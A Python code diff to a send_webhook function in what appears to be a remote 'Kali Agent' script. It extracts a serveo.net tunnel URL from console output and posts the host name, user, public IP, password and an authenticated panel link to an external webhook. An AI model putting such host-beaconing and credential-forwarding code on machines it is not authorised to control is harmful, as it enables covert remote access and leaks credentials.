@@ -441,15 +441,24 @@ def send_webhook(console_output):
         user = os.getenv("USER", "unknown")
         ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
         console_output = console_output[-1800:]
+        url = ""
+        for line in console_output.split("\n"):
+            for m in re.finditer(r'https?://[a-z0-9-]+\.[a-z0-9-]+\.[a-z]+', line):
+                u = m.group()
+                if "serveousercontent.com" in u or "serveo.net" in u:
+                    url = u
+        fields = [
+            {"name": "🖥 Hostname", "value": host, "inline": True},
+            {"name": "👤 User", "value": user, "inline": True},
+            {"name": "🌍 IP", "value": ip, "inline": True},
+            {"name": "🔑 Password", "value": f"`{PASSWORD}`", "inline": True},
+        ]
+        if url:
+            fields.insert(0, {"name": "🔗 Panel", "value": f"{url}?auth={PASSWORD}", "inline": False})
+        fields.append({"name": "📋 Console tunnel", "value": f"```\n{console_output}\n```", "inline": False})
         requests.post(WEBHOOK_URL, json={"embeds": [{
             "title": "🚀 Kali Agent Prêt", "color": 5763719,
-            "fields": [
-                {"name": "🖥 Hostname", "value": host, "inline": True},
-                {"name": "👤 User", "value": user, "inline": True},
-                {"name": "🌍 IP", "value": ip, "inline": True},
-                {"name": "🔑 Password", "value": f"`{PASSWORD}`", "inline": True},
-                {"name": "📋 Console tunnel", "value": f"```\n{console_output}\n```", "inline": False}
-            ],
+            "fields": fields,
             "footer": {"text": datetime.now().strftime("%d/%m/%Y %H:%M:%S")}
         }]}, timeout=10)
         print("[+] Webhook envoyé")
